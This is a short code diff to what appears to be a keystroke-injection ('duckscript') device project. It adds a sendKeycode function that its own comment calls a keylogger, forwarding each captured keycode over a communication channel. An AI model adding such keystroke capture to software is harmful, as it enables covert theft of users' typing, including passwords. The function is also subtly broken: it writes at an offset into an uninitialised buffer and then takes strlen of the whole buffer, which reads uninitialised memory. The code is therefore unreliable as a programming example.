@@ -123,4 +123,11 @@ namespace duckscript {
       buf[9] = '\0';
       com::send(buf, 9);
     }
+
+    //This is intended to send a character passed through from the keyboard (keylogger)
+    void sendKeycode(uint8_t a) {
+      char buf[20];
+      sprintf(buf + 9, "KEYCODE %02x\n", a);
+      com::send(buf, strlen(buf));
+    }
 }
